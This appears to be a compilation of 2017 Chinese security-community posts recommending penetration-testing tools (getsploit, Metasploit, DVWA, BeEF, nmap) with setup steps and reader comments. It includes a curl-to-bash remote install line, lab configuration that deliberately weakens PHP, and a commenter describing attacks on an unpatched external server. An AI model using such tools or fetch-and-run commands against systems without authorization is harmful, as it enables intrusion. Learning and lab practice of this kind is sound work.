# Tools
子目录:
- [合集](#合集)
- [getsploit](#getsploit)
- [Metasploit](#metasploit)
- [DVWA](#dvwa)
- [BeEF](#beef)
- [nmap](#nmap)
- [nc](#nc)
- [Kali](#kali)
- [Burp Suite](#burp-suite)
- [nethunter](#nethunter)
- [OSINT](#osint)
- [Secure Headers](#secure-headers)
- [隐写](#隐写)
- [Cracking](#cracking)
- [zANTI](#zanti)
- [XSS'OR](#xssor)
- [Proxy](#proxy)
- [杂](#杂)


## 合集

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-28:


__#工具#__

渗透技能树之利器 v1

LanT34m 汇编整理 | 20170528 更新

这份“透技能树之利器”内容包括：

Windows、Linux、Tunnel、JavaScript、Browser、OSINT、Domain、Dir、Social-Engineer、Pentest、Exploit、Virus、Proxy、Java、CTF、DDoS、IoT、SSL、Web、Brute-Force、Fuzz、Port、Cyber、Search-Engineer、Wi-Fi、MITM、DNS、Docker、Android、OS、Defense、Hardware、Other

注1：这个仅分享在本圈，信息量不小，大家慢慢吸收，每个利器我们都玩过
注2：有的利器没加上链接，大家可以自行 Github/Google

详情见附件。


__分享文件:__
[渗透技能树之利器 v1.pdf](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/%E6%B8%97%E9%80%8F%E6%8A%80%E8%83%BD%E6%A0%91%E4%B9%8B%E5%88%A9%E5%99%A8%20v1.pdf)

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-12:


__#资源#__

  推荐 BlackHat Arsenal 兵工厂

兵工厂是全球黑帽大会（BlackHat）的一个重要环节，来自全球有能力的黑客在上面分享自己或团队独创的黑兵器。

这届，我看到官方开始号召大家共同维护这个 GitHub：


[GitHub - toolswatch/blackhat-arsenal-tools: Official Black Hat Arsenal Security Tools Repository](https://github.com/toolswatch/blackhat-arsenal-tools)

去年我带团队分享了三个黑兵器（ZoomEye、Seebug、Pocsuite），得到了官方的友谊和好评。

这里准备响应官方号召，把我们的东西更新上去。

这上面好兵器真不少，推荐大家收藏学习研究。顺便在此号召下，好东西如果不是非得私有化，可以考虑开源，并在一些国际大会上分享出来，这样的交流氛围多好，对吧？

<img src="https://images.xiaomiquan.com/FmCi7JzgmNxBNLAoPmFzD_7UESAS?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-i5WP9J3HfjqYd6H7J2-7k5tu8g=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FgeMTRDBMhGl6b7HRnzvXc68QnWV?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PW_uM3bGEGqjn-I7SW56aMzNfdE=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fm8BLmQCC3QrngLBiCvGLIXmypdo?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:L025lT7sCaAKehX0elGQnvaKfi0=" width="50%" height="50%" align="middle"/>


---



## getsploit

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-17:


__#工具#__

getsploit

本圈嘉宾@Moriarty  的分享。

getsploit

这是我用过的，迄今为止最好用的exploit搜索工具。首先，它支持在线搜索，它的exploit来自于 Exploit-DB, Metasploit, Packetstorm等等，并保持同步更新。它另一个更贴心的功能是可以指定-m参数，将搜索到的exploit自动下载下来（很方便的说）。另外它也支持离线，你只需要指定-u参数（--update），就可以将完整的exploit库离线到本地(目前数量大概在2亿2千万左右）。

项目地址：


[GitHub - vulnersCom/getsploit: Command line utilit...](https://github.com/vulnersCom/getsploit)



<img src="https://images.xiaomiquan.com/Fkbxi6FZacx-3UZORwxONU-uQ5Gg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ckq-otnhitV3uiFizc_geTk-EHE=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FsrNMbhyZwPf5xtBMWsZPkpo8mbW?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:4bUuRoqH28JiuV3VWJ2uSdjs8jI=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: Python2.7.*内置sqlite3 并不支持FTS4 得下sqlite和Python源码编译 离线查询还得再折腾一下

<img src="https://file.xiaomiquan.com/48/65/48656b94e9e7832ed91ddb18cd8a7113a76b326cdbee625bccf6d77054dc1838.jpg" width="25px"/> __~~__: searchsploit也很好用啊，本身就是exploit-db的离线版，当然也支持查exploit的链接，也可以随时update

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/65/48656b94e9e7832ed91ddb18cd8a7113a76b326cdbee625bccf6d77054dc1838.jpg" width="25px"/> __~~__: 这个还包括其他db

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 居然有2亿多记录？？

<img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 我想问下载那么多会不会给电脑带来压力……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 另一个类似的：
[GitHub - 1N3/Findsploit: Find exploits in local an...](https://github.com/1N3/Findsploit)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 不会吧


...

---

## Metasploit

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-26:


__#姿势#__

  
__#工具#__

快速构建一台 Metasploit 渗透 VPS

官方有方案：


[Nightly Installers · rapid7/metasploit-framework W...](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)

 

仔细参考很容易。

如果你买的 VPS 内存小，那么可以这样来解决 MSF 启动的这个错误：

>virtual memory exhausted: Cannot allocate memory

```
# dd if=/dev/zero of=/swap bs=1024 count=1M
Format the swap file:
# mkswap /swap
Enable the swap file:
# swapon /swap
Enable swap on boot:
# echo "/swap swap swap sw 0 0" >> /etc/fstab
```

本质是加了个 swap 虚拟内存，用来解决物理内存过小导致的问题。

相关知识点请自行百度/Google。



...

<img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 搬瓦工VPS表示没法增加虚拟内存swap😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 我测试可以

<img src="https://file.xiaomiquan.com/b7/e6/b7e69b46a41fb2b83ead52c0ec57e5f92d63835489c4702b9b58e8c0f8c22136.jpg" width="25px"/> __木鸟__ replies to <img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 
[Setup Swap File on Linux - Vultr.com](https://www.vultr.com/docs/setup-swap-file-on-linux)

<img src="https://file.xiaomiquan.com/87/9b/879b7fb72d1b5082d3b82c8fec4a8b6136a17fb3e41ee54782cedbd2f968de77.jpg" width="25px"/> __杰瑞121__: 想买VPS，请大家推荐一个

<img src="https://file.xiaomiquan.com/ef/32/ef32f19fb831b0e5c8605107f6d50eebc65382eaff5bebdb0285c0e623b1c231.jpg" width="25px"/> __红薯__ replies to <img src="https://file.xiaomiquan.com/87/9b/879b7fb72d1b5082d3b82c8fec4a8b6136a17fb3e41ee54782cedbd2f968de77.jpg" width="25px"/> __杰瑞121__: 我今天刚买了搬瓦工，你可以试试，速度很快

<img src="https://file.xiaomiquan.com/87/9b/879b7fb72d1b5082d3b82c8fec4a8b6136a17fb3e41ee54782cedbd2f968de77.jpg" width="25px"/> __杰瑞121__ replies to <img src="https://file.xiaomiquan.com/ef/32/ef32f19fb831b0e5c8605107f6d50eebc65382eaff5bebdb0285c0e623b1c231.jpg" width="25px"/> __红薯__: 谢谢

<img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__ replies to <img src="https://file.xiaomiquan.com/b7/e6/b7e69b46a41fb2b83ead52c0ec57e5f92d63835489c4702b9b58e8c0f8c22136.jpg" width="25px"/> __木鸟__: 谢谢哦 但是显示无权限添加，据说是openvz无法自己加，我是256M的跑个WordPress就满了😂

<img src="https://file.xiaomiquan.com/c7/0e/c70e7f2914679c3ee81fe480ffd43b50fba930b7a160aba09eadbd6c4713c7d7.jpg" width="25px"/> __自牧__: 请问 512内存的VPS够用吗？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c7/0e/c70e7f2914679c3ee81fe480ffd43b50fba930b7a160aba09eadbd6c4713c7d7.jpg" width="25px"/> __自牧__: 没试过，至少一个G

<img src="https://file.xiaomiquan.com/c7/0e/c70e7f2914679c3ee81fe480ffd43b50fba930b7a160aba09eadbd6c4713c7d7.jpg" width="25px"/> __自牧__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好的，谢谢余哥


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-06-23:

__#工具#__ __#预告#__

Metasploit是一款开源的渗透测试框架，自从它问世，仿佛人人都可以成为一名黑客。当然Metasploit之所以能成为最优秀的黑客工具，不只因为它命令满屏幕飞的逼格，更因为其有着令人难以置信的安全检测和漏洞利用功能。尤其在内网渗透中，更是无往而不利。在接下来，我将以Metasploit为基础，向大家分享内网渗透相关的知识

Metasploit

项目地址：
[GitHub - rapid7/metasploit-framework: Metasploit F...](https://github.com/rapid7/metasploit-framework)


安装方法：
[Setting Up a Metasploit Development Environment · ...](https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment)



个人在渗透测试的时候，一般选择在VPS上搭建MSF（推荐，本圈前面有提），系统喜欢Ubuntu
如果嫌麻烦，也可以直接在本地用VMware安装kali2.0，自带msf。kali2.0安装方法：
[虚拟机安装kali2.0_百度经验](http://jingyan.baidu.com/article/93f9803f04e292e0e46f5533.html)





...

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 虚拟机的msf是不能外网渗透的吗？必须要外网环境才可以吗？（不是反弹shell那种，就单纯的像蓝屏攻击那种）

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 我好像没有理解到你的意思，这么说吧，无论你的msf搭在什么地方，只要可以让msf能访问到目标机器，直接访问也好，端口转发也好，socks代理也好，就能使用。你可以再具体描述一下情境

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 是不是不太会用虚拟机？

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 反弹shell需要外网IP我懂yy

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 对呀 就是我msf攻击虚拟机可以成功 攻击外网的没有打布丁的服务器不行 提示什么连不上rdp服务 但是3389开了的   不知道是exp不行还是网络问题😤

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 有防火墙吧

<img src="https://file.xiaomiquan.com/23/4f/234f71233cd7de9621f81fe36111b6a6cfe6a0292ea1aab5051ee0ae911c9e50.jpg" width="25px"/> __无意__: 我在centos7上装msf，装了一天都没装上，心都碎了

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/23/4f/234f71233cd7de9621f81fe36111b6a6cfe6a0292ea1aab5051ee0ae911c9e50.jpg" width="25px"/> __无意__: 慢慢装(～o～)Y


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-06-26:


__#资源#__

  MSF入门练习平台

了解并使用VMware搭建Metasploitable2。 Metasploitable2 是Metasploit团队维护的一个集成了各种漏洞弱点的Linux主机(ubuntu)镜像,方便广大黑扩跟安全人员进行MSF漏洞测试跟学习,免去搭建各种测试环境。 VMware: 直接打开Metasploitable.vmdk即可使用 登陆账号密码：msfadmin msfadmin

Metasploitable2下载地址:

[Metasploitable - Browse /Metasploitable2 at Source...](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)



注：目前Metasploitable3也早就发布了，而且环境更贴近实战，不过Metasploitable2更适合MSF入门学习。
[Metasploitable 3正式发布，附赠全球CTF大赛 - FreeBuf.COM | 关注黑...](http://www.freebuf.com/news/122341.html)

---


## DVWA



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:


__#姿势#__

  DVWA 漏洞测试环境的搭建过程

DVWA 有在我们的安全技能树里提到，以下是 Win10 下的搭建过程，来自@丹青  同学的分享，踏了一些坑，都解决了，感兴趣的同学可以参考。

如果你也有什么经验可以分享到圈子内的可以私信我交流。


1. 下载xampp,dvwa

2. 解压dvwa-master,把解压后的文件夹名字改为dvwa

3. 删除xampp文件夹里htdocs文件夹里的所有文件，然后把dvwa文件夹拷到htdocs文件夹里。

4. 把dvwa文件夹里的config文件的扩展名(.dist)去掉，编辑config文件的内容，把p@ssw0rd去掉

5. 用管理员权限打开xampp，点击start Apache,Mysql

6. 在浏览器端输入
`http://localhost/dvwa/setup.php`


7. 点击creat database，然后出现登录界面，用户名是admin,密码是password

8. 配置xampp控制台上的Apache,点击config中的PHP(php.ini),查找url_include,把它后面的Off改为On.

9. restart apache

10. 成功！！！

ps:xampp的下载地址:
[XAMPP Installers and Downloads for Apache Friends](https://www.apachefriends.org/zh_cn/index.html)



dvwa的下载地址:
[DVWA - Damn Vulnerable Web Application](http://www.dvwa.co.uk/)



视频教程地址:
[https://www.youtube.com/watch?v=cak2lQvBRAo&index=...](https://www.youtube.com/watch?v=cak2lQvBRAo&index=1&list=LLZ6KzzklgOHCRwQj8hNX89Q)





...

<img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 可以直接搭个metasploitable2啊，自带很多这种环境

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 不是一样的东西，也不影响这个分享

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 也可以，不过搭建过程好像对小白不是很友好😅

<img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 那个下载下来就是个虚拟机啊，打开直接用，根本不用搭建吧。。。

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 啊？不用配合其他虚拟平台吗？我刚刚去搜了一下这个东西，有一篇教程是在virtual box host 安装metasploitable2。。

<img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 默认下载的是做好的vmware的虚拟机

...

---

## BeEF

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-31:


__#工具#__

 浏览器利用框架 BeEF

BeEF(The Browser Exploitation Framework Project 的缩写) 是目前全球最好的开源浏览器利用框架，插件有很多，很值得参考学习。BeEF 这个缩写正好是牛肉的意思，所以玩这个玩多的人，一看到牛肉就想起了 BeEF。

玩前端黑客，如果能玩透 BeEF，在前端黑的利用方面就基本没什么大问题了，姿势非常的多。

命令行下一键安装方式：

`curl -L https://raw.githubusercontent.com/beefproject/beef/a6a7536e/install-beef | bash -s stable`

详细安装过程：

[Installation · beefproject/beef Wiki · GitHub](https://github.com/beefproject/beef/wiki/Installation)



使用：

`./beef`

BeEF 是基于 Ruby 编写的，数据库使用的是 SQLite。如果你正好在学 Ruby 且这么喜欢安全，BeEF 是个不错的参考。

<img src="https://images.xiaomiquan.com/FjDQ6Nw0ZqvMmhSrORs0wo5M2tvY?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mpBU-9F8JgX-QlKiGFQC6iRUWW0=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/ea/96/ea96bcf10ea8375a897a730e31b78a4736703d02cffb7ddb58d1bcd6c159ad4a.jpg" width="25px"/> __CLSY.__: Kali 下有这个，免安装了

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余弦大大，我可以不可以把beef理解为一个网络探针，并顺便有着浏览器漏洞利用工具的一个框架


可以。



---

## tcpdump


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-21:


__#姿势#__

在做网络分析这块，推荐最原生的命令 tcpdump

“只要和网络沾边，都可以使用 tcpdump 来排查问题。”

这篇文章作为 tcpdump 指南来说可供参考，虽然来说还是简单点，不过大多时候，我们不是职业做流量分析的，够用：


[tcpdump 指南](https://zzyongx.github.io/blogs/tcpdump-tutorial.html)



我 N 年前因为要调试一套复杂架构的网络问题，第一次上了 tcpdump，并结合 Wireshark 在本机进行可视化分析，效果很直接，一些复杂的问题容易找出本质。



...

<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 分享一种玩法 -w - 
输出pcap流到标准输出，管道或者其他方式实时读取分析
用这种方式写了一些内部协议实时分析的脚本，已经普及到公司开发者使用，反馈不错

<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 还有个问题分享下 -s0 参数受tcpdump版本限制。有时候抓不全包。 旧版本0就是65535

...

---


## nmap



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-14:


__#工具#__

  Nmap 7.50 正式发布：


[Download the Free Nmap Security Scanner for Linux/...](https://nmap.org/download.html)

 

新增 14 个 NSE 脚本，300 多个指纹规则。

Nmap 是玩安全的人必备的工具，无论攻防都必备，基于 Nmap 写插件（NSE 脚本）很容易，只需掌握 lua 脚本语言即可。

有同学问扫描器问题，其实能玩精 Nmap，这就是一款非常强大的扫描器，包括漏洞扫描！



...

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: nmap是不是不支持异步，英文是硬伤啊😖

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 你是怎么理解异步的

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 我理解的是它在扫描时发包后必须等到收包，只能通过设置较小的超时来缩短扫描时间。异步就是只管发包，不维护状态，收包另外一个线程负责。好像有个ma开头的软件就是这样的，比如要扫整个互联网的话速度会快些。

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不过只适用于端口扫描和存活扫描

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 最近用nmap搞内部分析，排除端口等信息收集很棒，感觉带脚本扫描并不比xscan之类有优势，比如带brute，时间上和结果上都不理想，不知道是不是用的不好。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 嗯 确实

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 他们有些插件其他也写得不好

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 
[NMAP 基础教程 | WooYun知识库](http://cb.drops.wiki/drops/tips-2002.html)


这里有篇nmap入门的文章，没接触过nmap的同学可以看下，
乌云知识库还有很多其他的好教程可以搜索 :)

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 感谢互动

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 😁，希望大家也能多互动多分享。

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 另外我也来说一下，在对外网一些目标做端口扫描的时候，目标如果有array等负载均衡设备(我猜测的),可能导致每个端口都会显示开放状态总之就是没法探测到到底真实开了什么端口，这个时候就用amap吧，不会有误报，可能nmap也有相关参数可以做到这种效果，但是我不知道。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-20:

半夜问下：谁想成为本圈嘉宾的可以私信我。嘉宾义务：每周至少分享一条干货，促进本圈的发展。好处：成为我们这个虚拟团队成员，这个虚拟团队目前有 4 人，最终不会超过 10 人。😘

...

<img src="https://file.xiaomiquan.com/0a/77/0a779376ed0171ed1b0d4d32b04cfbd349dae7b0bd421f8194ceb0c753f0fcd1.jpg" width="25px"/> __测试测试__: 我来歪楼~~推荐一个书 nmap 6 network exploration and security auditing cookbook😄😄😄

...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-08:


__#工具#__

 神兵利器之nmap
好吧，又是一个老套的工具，没有人不知道它，本来我是想开篇一个msf系列的，但是觉得nmap不管在渗透还是网络管理中都是必不可少的工具，必须熟练掌握那种，我敢打赌，密圈里50% 以上的人并不能熟练运用它。
有的人会说，不就是是扫描器吗？单个IP扫，整个网段扫，个别端口扫，我都会啊，大不了需要的时候再来查参数了。好吧，不过类似书到用时方知少一样，常用的工具熟练掌握是会对工作效率有很大提升的。
废话不多说，本来我是打算自己详细写写各个参数用法的，发现网上已经有非常详细的教程了，我就在基础上增加一些自己的经验吧。


本文由阿德马翻译自国外网站，请尊重劳动成果，转载请注明出处，谢谢
Nmap是一款网络扫描和主机检测的非常有用的工具。 Nmap是不局限于仅仅收集信息和枚举，同时可以用来作为一个漏洞探测器或安全扫描器。它可以适用于winodws,linux,mac等操作系统。Nmap是一款非常强大的实用工具,可用于：

+ 检测活在网络上的主机（主机发现）
+ 检测主机上开放的端口（端口发现或枚举）
+ 检测到相应的端口（服务发现）的软件和版本
+ 检测操作系统，硬件地址，以及软件版本
+ 检测脆弱性的漏洞（Nmap的脚本）

Nmap是一个非常普遍的工具，它有命令行界面和图形用户界面。本人包括以下方面的内容:

+ 介绍Nmap
+ 扫描中的重要参数
+ 操作系统检测
